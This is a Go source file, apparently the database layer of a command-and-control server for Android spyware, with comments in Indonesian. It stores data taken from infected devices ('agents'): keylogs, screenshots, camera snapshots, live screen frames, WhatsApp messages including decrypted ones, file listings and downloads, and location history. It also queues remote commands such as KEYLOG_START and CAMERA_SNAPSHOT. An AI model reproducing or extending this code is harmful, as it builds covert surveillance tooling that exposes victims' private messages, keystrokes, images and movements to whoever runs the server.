package main

import (
    "database/sql"
    "encoding/json"
    "log"
    "strings"
    "time"

    _ "github.com/mattn/go-sqlite3"
)

type Database struct {
    db *sql.DB
}

func InitDB(config *Config) *Database {
    db, err := sql.Open("sqlite3", config.DatabasePath)
    if err != nil {
        log.Fatalf("Failed to open database: %v", err)
    }

    // Enable foreign keys
    db.Exec("PRAGMA foreign_keys = ON")

    createTables := `
    CREATE TABLE IF NOT EXISTS agents (
        id TEXT PRIMARY KEY,
        device TEXT,
        android TEXT,
        manufacturer TEXT,
        connected_at DATETIME,
        last_seen DATETIME,
        status TEXT,
        mirroring INTEGER DEFAULT 0,
        latitude REAL,
        longitude REAL,
        metadata TEXT
    );

    CREATE TABLE IF NOT EXISTS commands (
        id TEXT PRIMARY KEY,
        agent_id TEXT,
        command TEXT,
        params TEXT,
        issued_at DATETIME,
        status TEXT,
        result TEXT,
        completed_at DATETIME,
        FOREIGN KEY (agent_id) REFERENCES agents (id)
    );

    CREATE TABLE IF NOT EXISTS responses (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT,
        command TEXT,
        response TEXT,
        timestamp DATETIME,
        FOREIGN KEY (agent_id) REFERENCES agents (id)
    );

    CREATE TABLE IF NOT EXISTS screenshots (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT,
        image_data TEXT,
        width INTEGER,
        height INTEGER,
        timestamp DATETIME,
        FOREIGN KEY (agent_id) REFERENCES agents (id)
    );

    CREATE TABLE IF NOT EXISTS camera_snapshots (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT,
        image_data TEXT,
        width INTEGER,
        height INTEGER,
        timestamp DATETIME,
        FOREIGN KEY (agent_id) REFERENCES agents (id)
    );

    CREATE TABLE IF NOT EXISTS screen_frames (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT,
        frame_data TEXT,
        width INTEGER,
        height INTEGER,
        frame_number INTEGER,
        timestamp DATETIME,
        FOREIGN KEY (agent_id) REFERENCES agents (id)
    );

    CREATE TABLE IF NOT EXISTS keylogs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT,
        key_data TEXT,
        app TEXT,
        timestamp DATETIME,
        FOREIGN KEY (agent_id) REFERENCES agents (id)
    );

    CREATE TABLE IF NOT EXISTS whatsapp_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT,
        messages TEXT,
        timestamp DATETIME,
        FOREIGN KEY (agent_id) REFERENCES agents (id)
    );

    CREATE TABLE IF NOT EXISTS whatsapp_decrypted (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT,
        decrypted_data TEXT,
        metadata TEXT,
        timestamp DATETIME,
        FOREIGN KEY (agent_id) REFERENCES agents (id)
    );

    CREATE TABLE IF NOT EXISTS all_responses (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT,
        raw_data TEXT,
        command TEXT,
        result TEXT,
        timestamp DATETIME,
        FOREIGN KEY (agent_id) REFERENCES agents (id)
    );

    -- ==================== FILES TABLES ====================
    CREATE TABLE IF NOT EXISTS files_list (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT,
        data TEXT,
        timestamp INTEGER,
        FOREIGN KEY (agent_id) REFERENCES agents (id)
    );

    CREATE TABLE IF NOT EXISTS downloaded_files (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT,
        filename TEXT,
        data TEXT,
        size INTEGER,
        timestamp INTEGER,
        FOREIGN KEY (agent_id) REFERENCES agents (id)
    );
    
    CREATE TABLE IF NOT EXISTS location_history (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT,
    latitude REAL,
    longitude REAL,
    accuracy REAL,
    provider TEXT,
    altitude REAL,
    speed REAL,
    bearing REAL,
    timestamp DATETIME,
    FOREIGN KEY (agent_id) REFERENCES agents (id)
);

CREATE INDEX IF NOT EXISTS idx_location_history_agent ON location_history(agent_id);
CREATE INDEX IF NOT EXISTS idx_location_history_timestamp ON location_history(timestamp);

    CREATE INDEX IF NOT EXISTS idx_commands_agent ON commands(agent_id);
    CREATE INDEX IF NOT EXISTS idx_responses_agent ON responses(agent_id);
    CREATE INDEX IF NOT EXISTS idx_screenshots_agent ON screenshots(agent_id);
    CREATE INDEX IF NOT EXISTS idx_keylogs_agent ON keylogs(agent_id);
    CREATE INDEX IF NOT EXISTS idx_whatsapp_agent ON whatsapp_messages(agent_id);
    CREATE INDEX IF NOT EXISTS idx_all_responses_agent ON all_responses(agent_id);
    CREATE INDEX IF NOT EXISTS idx_files_list_agent ON files_list(agent_id);
    CREATE INDEX IF NOT EXISTS idx_downloaded_files_agent ON downloaded_files(agent_id);
    `

    if _, err := db.Exec(createTables); err != nil {
        log.Fatalf("Failed to create tables: %v", err)
    }

    log.Println("✅ Database initialized")
    return &Database{db: db}
}

func (d *Database) Close() {
    if d.db != nil {
        d.db.Close()
    }
}

// ==================== AGENT ====================

func (d *Database) AddAgent(agent *Agent) error {
    metadata, _ := json.Marshal(agent.Metadata)
    _, err := d.db.Exec(
        `INSERT OR REPLACE INTO agents 
        (id, device, android, manufacturer, connected_at, last_seen, status, mirroring, metadata) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        agent.ID, agent.Device, agent.Android, agent.Manufacturer,
        agent.ConnectedAt, agent.LastSeen, agent.Status,
        boolToInt(agent.Mirroring), string(metadata),
    )
    return err
}

func (d *Database) UpdateAgentStatus(id, status string) error {
    _, err := d.db.Exec(
        "UPDATE agents SET status = ?, last_seen = ? WHERE id = ?",
        status, time.Now(), id,
    )
    return err
}

func (d *Database) UpdateAgentLastSeen(id string) error {
    _, err := d.db.Exec(
        "UPDATE agents SET last_seen = ? WHERE id = ?",
        time.Now(), id,
    )
    return err
}

func (d *Database) UpdateAgentLocation(id string, lat, lng float64) error {
    _, err := d.db.Exec(
        "UPDATE agents SET latitude = ?, longitude = ? WHERE id = ?",
        lat, lng, id,
    )
    return err
}

func (d *Database) UpdateAgentMirrorStatus(id string, active bool) error {
    _, err := d.db.Exec(
        "UPDATE agents SET mirroring = ? WHERE id = ?",
        boolToInt(active), id,
    )
    return err
}

func (d *Database) UpdateAgentMetadata(id, key string, value interface{}) error {
    var metadataJSON string
    err := d.db.QueryRow("SELECT metadata FROM agents WHERE id = ?", id).Scan(&metadataJSON)
    if err != nil {
        return err
    }

    var metadata map[string]interface{}
    if metadataJSON != "" {
        json.Unmarshal([]byte(metadataJSON), &metadata)
    } else {
        metadata = make(map[string]interface{})
    }

    metadata[key] = value
    newMetadata, _ := json.Marshal(metadata)

    _, err = d.db.Exec(
        "UPDATE agents SET metadata = ? WHERE id = ?",
        string(newMetadata), id,
    )
    return err
}

// ==================== COMMANDS ====================

func (d *Database) AddCommand(agentID string, cmd Command) error {
    _, err := d.db.Exec(
        `INSERT INTO commands (id, agent_id, command, params, issued_at, status) 
        VALUES (?, ?, ?, ?, ?, ?)`,
        cmd.ID, agentID, cmd.Command, cmd.Params, cmd.IssuedAt, cmd.Status,
    )
    return err
}

func (d *Database) UpdateCommandStatus(id, status string) error {
    completedAt := time.Time{}
    if status == "completed" || status == "failed" {
        completedAt = time.Now()
    }
    _, err := d.db.Exec(
        "UPDATE commands SET status = ?, completed_at = ? WHERE id = ?",
        status, completedAt, id,
    )
    return err
}

func (d *Database) UpdateCommandResult(id, result string) error {
    _, err := d.db.Exec(
        "UPDATE commands SET result = ? WHERE id = ?",
        result, id,
    )
    return err
}

func (d *Database) GetPendingCommands(agentID string) []Command {
    rows, err := d.db.Query(
        "SELECT id, command, params, issued_at, status FROM commands WHERE agent_id = ? AND status = 'pending' ORDER BY issued_at ASC",
        agentID,
    )
    if err != nil {
        return nil
    }
    defer rows.Close()

    var commands []Command
    for rows.Next() {
        var cmd Command
        rows.Scan(&cmd.ID, &cmd.Command, &cmd.Params, &cmd.IssuedAt, &cmd.Status)
        commands = append(commands, cmd)
    }
    return commands
}

// ==================== RESPONSES ====================

func (d *Database) AddResponse(agentID, command, response string) error {
    _, err := d.db.Exec(
        "INSERT INTO responses (agent_id, command, response, timestamp) VALUES (?, ?, ?, ?)",
        agentID, command, response, time.Now(),
    )
    return err
}

// ✅ SIMPAN SEMUA RAW RESPONSE
func (d *Database) AddAllResponse(agentID, rawData string) error {
    var command string
    var result string

    // Parse untuk mendapatkan command dan result
    var msg Message
    if err := json.Unmarshal([]byte(rawData), &msg); err == nil {
        // ✅ Parse command jika JSON string
        cmd := msg.Command
        if strings.HasPrefix(cmd, "{") {
            var cmdObj map[string]interface{}
            if err := json.Unmarshal([]byte(cmd), &cmdObj); err == nil {
                if c, ok := cmdObj["command"].(string); ok && c != "" {
                    command = c
                }
                // Ambil ID juga
                if id, ok := cmdObj["id"].(string); ok && id != "" {
                    // Simpan di result untuk referensi
                    if result == "" {
                        result = "{\"id\":\"" + id + "\"}"
                    }
                }
            }
        } else {
            command = cmd
        }
        if msg.Result != nil {
            result = string(msg.Result)
        }
    } else {
        // Coba parse sebagai map
        var data map[string]interface{}
        if err := json.Unmarshal([]byte(rawData), &data); err == nil {
            if cmd, ok := data["command"].(string); ok {
                command = cmd
            }
            if res, ok := data["result"]; ok {
                if resBytes, err := json.Marshal(res); err == nil {
                    result = string(resBytes)
                }
            }
        }
    }

    // Jika command masih kosong, coba dari raw data
    if command == "" {
        if strings.Contains(rawData, "SCREEN_START") {
            command = "SCREEN_START"
        } else if strings.Contains(rawData, "SCREEN_STOP") {
            command = "SCREEN_STOP"
        } else if strings.Contains(rawData, "KEYLOG_DUMP") {
            command = "KEYLOG_DUMP"
        } else if strings.Contains(rawData, "KEYLOG_START") {
            command = "KEYLOG_START"
        } else if strings.Contains(rawData, "KEYLOG_STOP") {
            command = "KEYLOG_STOP"
        } else if strings.Contains(rawData, "KEYLOG_STATUS") {
            command = "KEYLOG_STATUS"
        } else if strings.Contains(rawData, "SCREENSHOT") {
            command = "SCREENSHOT"
        } else if strings.Contains(rawData, "CAMERA_SNAPSHOT") {
            command = "CAMERA_SNAPSHOT"
        } else if strings.Contains(rawData, "GET_DEVICE_INFO") {
            command = "GET_DEVICE_INFO"
        } else if strings.Contains(rawData, "GET_LOCATION") {
            command = "GET_LOCATION"
        } else if strings.Contains(rawData, "WA_") {
            command = "WHATSAPP"
        } else if strings.Contains(rawData, "GET_FILES_LIST") {
            command = "GET_FILES_LIST"
        } else if strings.Contains(rawData, "DOWNLOAD_FILE") {
            command = "DOWNLOAD_FILE"
        } else {
            command = "UNKNOWN"
        }
    }

    _, err := d.db.Exec(
        "INSERT INTO all_responses (agent_id, raw_data, command, result, timestamp) VALUES (?, ?, ?, ?, ?)",
        agentID, rawData, command, result, time.Now(),
    )
    return err
}

// ==================== SCREENSHOTS ====================

func (d *Database) AddScreenshot(agentID, imageData string, metadata map[string]interface{}) error {
    width, _ := metadata["width"].(float64)
    height, _ := metadata["height"].(float64)
    _, err := d.db.Exec(
        "INSERT INTO screenshots (agent_id, image_data, width, height, timestamp) VALUES (?, ?, ?, ?, ?)",
        agentID, imageData, int(width), int(height), time.Now(),
    )
    return err
}

func (d *Database) AddCameraSnapshot(agentID, imageData string, metadata map[string]interface{}) error {
    width, _ := metadata["width"].(float64)
    height, _ := metadata["height"].(float64)
    _, err := d.db.Exec(
        "INSERT INTO camera_snapshots (agent_id, image_data, width, height, timestamp) VALUES (?, ?, ?, ?, ?)",
        agentID, imageData, int(width), int(height), time.Now(),
    )
    return err
}

func (d *Database) AddScreenFrame(agentID, frameData string, metadata map[string]interface{}) error {
    width, _ := metadata["width"].(float64)
    height, _ := metadata["height"].(float64)
    frameNum, _ := metadata["frame_number"].(float64)
    _, err := d.db.Exec(
        "INSERT INTO screen_frames (agent_id, frame_data, width, height, frame_number, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
        agentID, frameData, int(width), int(height), int(frameNum), time.Now(),
    )
    return err
}

// ==================== KEYLOGS ====================

func (d *Database) AddKeylog(agentID, key string, metadata map[string]interface{}) error {
    app, _ := metadata["app"].(string)
    _, err := d.db.Exec(
        "INSERT INTO keylogs (agent_id, key_data, app, timestamp) VALUES (?, ?, ?, ?)",
        agentID, key, app, time.Now(),
    )
    return err
}

func (d *Database) AddKeylogs(agentID, logs string) error {
    // ✅ POTONG JIKA TERLALU PANJANG
    if len(logs) > 1000000 {
        logs = logs[:1000000] + "... (truncated)"
    }

    _, err := d.db.Exec(
        "INSERT INTO keylogs (agent_id, key_data, app, timestamp) VALUES (?, ?, ?, ?)",
        agentID, logs, "dump", time.Now(),
    )
    return err
}

// ==================== WHATSAPP ====================

func (d *Database) AddWhatsAppMessages(agentID, messages string) error {
    _, err := d.db.Exec(
        "INSERT INTO whatsapp_messages (agent_id, messages, timestamp) VALUES (?, ?, ?)",
        agentID, messages, time.Now(),
    )
    return err
}

func (d *Database) AddWhatsAppDecrypted(agentID, data string, metadata map[string]interface{}) error {
    metaJSON, _ := json.Marshal(metadata)
    _, err := d.db.Exec(
        "INSERT INTO whatsapp_decrypted (agent_id, decrypted_data, metadata, timestamp) VALUES (?, ?, ?, ?)",
        agentID, data, string(metaJSON), time.Now(),
    )
    return err
}

// ==================== FILES ====================

func (d *Database) AddFilesList(agentID string, data map[string]interface{}) error {
    jsonData, err := json.Marshal(data)
    if err != nil {
        log.Printf("⚠️ Failed to marshal files list data: %v", err)
        return err
    }

    _, err = d.db.Exec(
        "INSERT INTO files_list (agent_id, data, timestamp) VALUES (?, ?, ?)",
        agentID, string(jsonData), time.Now().Unix(),
    )
    if err != nil {
        log.Printf("⚠️ Failed to save files list: %v", err)
        return err
    }
    log.Printf("📁 Files list saved for agent %s", agentID)
    return nil
}

func (d *Database) AddDownloadedFile(agentID string, data map[string]interface{}) error {
    filename, _ := data["filename"].(string)
    fileData, _ := data["data"].(string)
    size, _ := data["size"].(float64)

    _, err := d.db.Exec(
        "INSERT INTO downloaded_files (agent_id, filename, data, size, timestamp) VALUES (?, ?, ?, ?, ?)",
        agentID, filename, fileData, int(size), time.Now().Unix(),
    )
    if err != nil {
        log.Printf("⚠️ Failed to save downloaded file: %v", err)
        return err
    }
    log.Printf("⬇️ Downloaded file saved: %s (%d bytes)", filename, int(size))
    return nil
}

func (d *Database) GetFilesList(agentID string) ([]map[string]interface{}, error) {
    rows, err := d.db.Query(
        "SELECT data, timestamp FROM files_list WHERE agent_id = ? ORDER BY timestamp DESC LIMIT 1",
        agentID,
    )
    if err != nil {
        return nil, err
    }
    defer rows.Close()

    var results []map[string]interface{}
    for rows.Next() {
        var dataJSON string
        var timestamp int64
        if err := rows.Scan(&dataJSON, &timestamp); err != nil {
            continue
        }
        var data map[string]interface{}
        if err := json.Unmarshal([]byte(dataJSON), &data); err == nil {
            data["timestamp"] = timestamp
            results = append(results, data)
        }
    }
    return results, nil
}

func (d *Database) GetDownloadedFiles(agentID string, limit int) ([]map[string]interface{}, error) {
    if limit <= 0 {
        limit = 10
    }
    rows, err := d.db.Query(
        "SELECT filename, data, size, timestamp FROM downloaded_files WHERE agent_id = ? ORDER BY timestamp DESC LIMIT ?",
        agentID, limit,
    )
    if err != nil {
        return nil, err
    }
    defer rows.Close()

    var results []map[string]interface{}
    for rows.Next() {
        var filename, fileData string
        var size int
        var timestamp int64
        if err := rows.Scan(&filename, &fileData, &size, &timestamp); err != nil {
            continue
        }
        results = append(results, map[string]interface{}{
            "filename":  filename,
            "data":      fileData,
            "size":      size,
            "timestamp": timestamp,
        })
    }
    return results, nil
}


// database.go - Tambahkan di bagian akhir

// ==================== LOCATION HISTORY ====================

func (d *Database) AddLocationHistory(agentID string, location map[string]interface{}) error {
    lat, _ := location["latitude"].(float64)
    lng, _ := location["longitude"].(float64)
    accuracy, _ := location["accuracy"].(float64)
    provider, _ := location["provider"].(string)
    altitude, _ := location["altitude"].(float64)
    speed, _ := location["speed"].(float64)
    bearing, _ := location["bearing"].(float64)
    
    timestamp := time.Now()
    if ts, ok := location["timestamp"].(string); ok {
        if t, err := time.Parse(time.RFC3339, ts); err == nil {
            timestamp = t
        }
    }

    _, err := d.db.Exec(
        `INSERT INTO location_history 
        (agent_id, latitude, longitude, accuracy, provider, altitude, speed, bearing, timestamp) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        agentID, lat, lng, accuracy, provider, altitude, speed, bearing, timestamp,
    )
    return err
}

func (d *Database) GetLocationHistory(agentID string, limit int) ([]map[string]interface{}, error) {
    if limit <= 0 {
        limit = 100
    }
    
    rows, err := d.db.Query(
        `SELECT latitude, longitude, accuracy, provider, altitude, speed, bearing, timestamp 
         FROM location_history 
         WHERE agent_id = ? 
         ORDER BY timestamp DESC 
         LIMIT ?`,
        agentID, limit,
    )
    if err != nil {
        return nil, err
    }
    defer rows.Close()

    var history []map[string]interface{}
    for rows.Next() {
        var lat, lng, accuracy, altitude, speed, bearing float64
        var provider string
        var timestamp time.Time
        
        if err := rows.Scan(&lat, &lng, &accuracy, &provider, &altitude, &speed, &bearing, &timestamp); err != nil {
            continue
        }
        
        history = append(history, map[string]interface{}{
            "latitude":  lat,
            "longitude": lng,
            "accuracy":  accuracy,
            "provider":  provider,
            "altitude":  altitude,
            "speed":     speed,
            "bearing":   bearing,
            "timestamp": timestamp.Format(time.RFC3339),
        })
    }
    return history, nil
}

// ==================== UTILITY ====================

func boolToInt(b bool) int {
    if b {
        return 1
    }
    return 0
}
